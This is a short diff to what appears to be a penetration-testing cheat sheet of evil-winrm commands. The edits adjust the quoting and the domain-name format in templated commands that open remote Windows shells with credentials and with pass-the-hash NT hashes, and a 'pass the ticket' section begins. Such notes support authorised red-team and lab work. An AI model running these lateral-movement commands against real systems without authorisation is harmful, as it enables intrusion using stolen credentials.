@@ -4,11 +4,11 @@
 
 ## local account with creds
 ```bash
-evil-winrm -i <ip> -u <user> -p <password>
+evil-winrm -i <ip> -u <user> -p '<password>'
 ```
 ## domain account with creds
 ```bash
-evil-winrm -i <ip> -u '<domain_fqdn>\<user>' -p <password>
+evil-winrm -i <ip> -u '<domain_netbios>\<user>' -p '<password>'
 ```
 
 ## local account pth
@@ -18,7 +18,7 @@ evil-winrm -i <ip> -u <user> -H <nt_hash>
 
 ## domain account pth
 ```bash
-evil-winrm -i <ip> -u '<domain_fqdn>\<user>' -H <nt_hash>
+evil-winrm -i <ip> -u '<domain_netbios>\<user>' -H <nt_hash>
 ```
 
 ## pass the ticket
